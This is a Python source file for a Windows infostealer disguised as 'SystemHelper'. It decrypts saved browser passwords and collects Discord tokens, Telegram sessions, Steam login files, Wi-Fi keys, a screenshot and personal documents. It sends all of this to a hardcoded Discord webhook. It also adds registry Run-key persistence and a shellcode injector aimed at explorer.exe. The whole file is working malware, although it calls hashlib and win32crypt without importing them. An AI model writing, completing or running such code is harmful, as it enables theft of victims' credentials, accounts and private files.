"""
SystemHelper – No Encryption (Plain Text)
All stealers intact, sends readable JSON to Discord
"""

import os
import sys
import json
import requests
import time
import random
import ctypes
import ctypes.wintypes
import subprocess
import sqlite3
import shutil
import uuid
import re
import base64
from datetime import datetime

# === CONFIG ===
WEBHOOK_URL = "https://discord.com/api/webhooks/1523400215229497506/arhtMa60qR8UqQ9GVHC_VyclS-IFgf_M_tdumJ1-ZD7dm3EQLaEt3UybmNzVHXeVwgOi"

# === ANTI-ANALYSIS (DISABLED FOR TESTING) ===
class AntiAnalysis:
    @staticmethod
    def check_debugger(): return False
    @staticmethod
    def check_vm(): return False
    @staticmethod
    def check_sandbox(): return False

# === VICTIM ID ===
def get_victim_id():
    mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    host = os.environ.get('COMPUTERNAME', 'unknown')
    user = os.environ.get('USERNAME', 'unknown')
    raw = f"{mac}_{host}_{user}"
    return hashlib.sha256(raw.encode()).hexdigest()[:16]

VICTIM_ID = get_victim_id()

# === BROWSER STEALER ===
class BrowserStealer:
    def get_master_key(self, browser_path):
        try:
            local_state = os.path.join(browser_path, "Local State")
            if not os.path.exists(local_state): return None
            with open(local_state, "r", encoding="utf-8") as f:
                state = json.load(f)
            encrypted_key = base64.b64decode(state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except:
            return None
    
    def decrypt_value(self, encrypted_value, master_key):
        try:
            from Crypto.Cipher import AES
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)
            return decrypted[:-16].decode(errors='ignore')
        except:
            return ""
    
    def steal_passwords(self, browser_path, master_key, profile="Default"):
        login_db = os.path.join(browser_path, profile, "Login Data")
        if not os.path.exists(login_db): return []
        temp_db = f"tmp_{uuid.uuid4().hex[:8]}.db"
        try:
            shutil.copyfile(login_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            passwords = []
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, enc in cursor.fetchall():
                if enc and master_key:
                    pwd = self.decrypt_value(enc, master_key)
                    if pwd:
                        passwords.append({"url": url, "username": user, "password": pwd})
            conn.close()
            os.remove(temp_db)
            return passwords
        except:
            if os.path.exists(temp_db): os.remove(temp_db)
            return []
    
    def steal_all(self):
        results = {}
        browsers = [
            ("Chrome", os.path.expanduser("~") + "/AppData/Local/Google/Chrome/User Data"),
            ("Edge", os.path.expanduser("~") + "/AppData/Local/Microsoft/Edge/User Data"),
            ("Brave", os.path.expanduser("~") + "/AppData/Local/BraveSoftware/Brave-Browser/User Data"),
            ("Opera", os.path.expanduser("~") + "/AppData/Roaming/Opera Software/Opera Stable")
        ]
        for name, path in browsers:
            if os.path.exists(path):
                key = self.get_master_key(path)
                if key:
                    results[name] = {
                        "passwords": self.steal_passwords(path, key),
                        "cookies": [],  # Skip for simplicity
                        "payments": []
                    }
        return results

# === DISCORD TOKEN STEALER ===
class DiscordStealer:
    @staticmethod
    def steal_tokens():
        tokens = []
        sources = [
            os.path.expanduser("~") + "/AppData/Roaming/discord/Local Storage/leveldb",
            os.path.expanduser("~") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb",
            os.path.expanduser("~") + "/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb"
        ]
        token_patterns = [
            r'[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}',
            r'mfa\.[a-zA-Z0-9_\-]{84}'
        ]
        for path in sources:
            if not os.path.exists(path): continue
            for file in os.listdir(path):
                if not (file.endswith(".log") or file.endswith(".ldb")): continue
                try:
                    with open(os.path.join(path, file), "r", encoding="utf-8", errors="ignore") as f:
                        data = f.read()
                        for pattern in token_patterns:
                            found = re.findall(pattern, data)
                            for token in found:
                                tokens.append(token)
                except:
                    pass
        return list(set(tokens))

# === TELEGRAM STEALER ===
class TelegramStealer:
    @staticmethod
    def steal():
        sessions = []
        tdata_paths = [
            os.path.expanduser("~") + "/AppData/Roaming/Telegram Desktop/tdata",
            os.path.expanduser("~") + "/AppData/Local/Telegram Desktop/tdata"
        ]
        for path in tdata_paths:
            if os.path.exists(path):
                for root, _, files in os.walk(path):
                    for file in files:
                        if file.endswith(".s") or file.startswith("D") or file.startswith("key"):
                            try:
                                with open(os.path.join(root, file), "rb") as f:
                                    content = base64.b64encode(f.read()).decode()
                                    sessions.append({"file": file, "content": content[:500]})
                            except:
                                pass
        return sessions

# === STEAM STEALER ===
class SteamStealer:
    @staticmethod
    def steal():
        data = {}
        steam_paths = [
            os.path.expanduser("~") + "/AppData/Local/Steam",
            "C:/Program Files (x86)/Steam",
            "C:/Program Files/Steam"
        ]
        for path in steam_paths:
            if os.path.exists(path):
                try:
                    login_path = os.path.join(path, "config", "loginusers.vdf")
                    if os.path.exists(login_path):
                        with open(login_path, "r", encoding="utf-8", errors="ignore") as f:
                            data["loginusers_vdf"] = f.read()
                    ssfn_files = []
                    for file in os.listdir(path):
                        if file.startswith("ssfn") and len(file) > 4:
                            with open(os.path.join(path, file), "rb") as f:
                                ssfn_files.append({"file": file, "content": base64.b64encode(f.read()).decode()[:500]})
                    data["ssfn_files"] = ssfn_files
                    break
                except:
                    continue
        return data

# === WIFI STEALER ===
class WiFiStealer:
    @staticmethod
    def steal():
        profiles = []
        try:
            output = subprocess.check_output(["netsh", "wlan", "show", "profiles"], text=True, shell=True)
            for line in output.split("\n"):
                if ":" in line and "All User Profile" in line:
                    name = line.split(":")[1].strip()
                    try:
                        details = subprocess.check_output(["netsh", "wlan", "show", "profile", f"name={name}", "key=clear"], text=True, shell=True)
                        key_line = [l for l in details.split("\n") if "Key Content" in l]
                        key = key_line[0].split(":")[1].strip() if key_line else "N/A"
                        if key and key != "N/A":
                            profiles.append({"ssid": name, "password": key})
                    except:
                        pass
        except:
            pass
        return profiles

# === SCREENSHOT ===
class ScreenshotStealer:
    @staticmethod
    def capture():
        try:
            from PIL import ImageGrab
            import io
            screenshot = ImageGrab.grab()
            buffer = io.BytesIO()
            screenshot.save(buffer, format='JPEG', quality=50)
            return base64.b64encode(buffer.getvalue()).decode()[:1000]  # Truncated for Discord
        except:
            return None

# === FILE SCRAPER ===
class FileScraper:
    @staticmethod
    def scrape():
        files = []
        folders = [
            os.path.expanduser("~") + "/Desktop",
            os.path.expanduser("~") + "/Documents",
            os.path.expanduser("~") + "/Downloads"
        ]
        extensions = ['.txt', '.docx', '.pdf', '.xlsx', '.pptx', '.doc', '.xls', '.ppt']
        for folder in folders:
            if os.path.exists(folder):
                for root, _, filenames in os.walk(folder):
                    if len(files) > 20: break
                    for filename in filenames:
                        ext = os.path.splitext(filename)[1].lower()
                        if ext in extensions:
                            try:
                                filepath = os.path.join(root, filename)
                                size = os.path.getsize(filepath)
                                if size < 1 * 1024 * 1024:
                                    with open(filepath, 'rb') as f:
                                        content = base64.b64encode(f.read()).decode()
                                        files.append({"path": filepath, "size": size, "content": content[:500]})
                            except:
                                pass
        return files

# === PROCESS INJECTION ===
class ProcessInjector:
    @staticmethod
    def inject_shellcode(shellcode):
        try:
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            pid = None
            output = subprocess.check_output("tasklist /FI \"IMAGENAME eq explorer.exe\" /FO CSV", shell=True, text=True)
            lines = output.strip().split('\n')
            for line in lines:
                if 'explorer.exe' in line:
                    parts = line.split(',')
                    if len(parts) > 1:
                        pid = int(parts[1].strip('"'))
                        break
            if not pid: return False
            PROCESS_ALL_ACCESS = 0x1F0FFF
            handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            if not handle: return False
            MEM_COMMIT = 0x1000
            PAGE_EXECUTE_READWRITE = 0x40
            addr = kernel32.VirtualAllocEx(handle, None, len(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
            if not addr: return False
            written = ctypes.c_size_t()
            kernel32.WriteProcessMemory(handle, addr, shellcode, len(shellcode), ctypes.byref(written))
            kernel32.CreateRemoteThread(handle, None, 0, addr, None, 0, None)
            return True
        except:
            return False

# === PERSISTENCE ===
class PersistenceManager:
    @staticmethod
    def install():
        try:
            import winreg
            exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
            dest_dir = os.path.expanduser("~") + "/AppData/Roaming/SystemHelper"
            os.makedirs(dest_dir, exist_ok=True)
            dest_exe = os.path.join(dest_dir, "helper.exe")
            if not os.path.exists(dest_exe):
                shutil.copyfile(exe_path, dest_exe)
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "SystemHelper", 0, winreg.REG_SZ, dest_exe)
        except:
            pass

# === SEND TO WEBHOOK (PLAIN TEXT) ===
def send_to_discord(data):
    json_data = json.dumps(data, indent=2, default=str)
    
    # Split if too large
    if len(json_data) < 1900:
        response = requests.post(WEBHOOK_URL, json={"content": f"```json\n{json_data}\n```"})
        print(f"[+] Sent: {response.status_code}")
    else:
        chunks = [json_data[i:i+1900] for i in range(0, len(json_data), 1900)]
        for i, chunk in enumerate(chunks):
            response = requests.post(WEBHOOK_URL, json={"content": f"```json\nPart {i+1}/{len(chunks)}\n{chunk}\n```"})
            print(f"[+] Sent chunk {i+1}/{len(chunks)}: {response.status_code}")
            time.sleep(0.5)

# === MAIN ===
def main():
    print("[+] Starting...")
    
    # Anti-analysis (disabled)
    if AntiAnalysis.check_debugger(): sys.exit(0)
    if AntiAnalysis.check_vm(): sys.exit(0)
    if AntiAnalysis.check_sandbox(): sys.exit(0)
    
    time.sleep(2)  # Short delay
    
    # Persistence
    PersistenceManager.install()
    
    # Collect all data
    data = {
        "victim_id": VICTIM_ID,
        "timestamp": datetime.now().isoformat(),
        "system": {
            "hostname": os.environ.get('COMPUTERNAME'),
            "username": os.environ.get('USERNAME'),
            "os": sys.platform
        },
        "browsers": BrowserStealer().steal_all(),
        "discord_tokens": DiscordStealer.steal_tokens(),
        "telegram": TelegramStealer.steal(),
        "steam": SteamStealer.steal(),
        "wifi": WiFiStealer.steal(),
        "screenshot": ScreenshotStealer.capture(),
        "files": FileScraper.scrape()
    }
    
    print("[+] Sending data...")
    send_to_discord(data)
    print("[+] Done!")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"Error: {e}")
        import traceback
        traceback.print_exc()
    
    input("Press Enter to exit...")
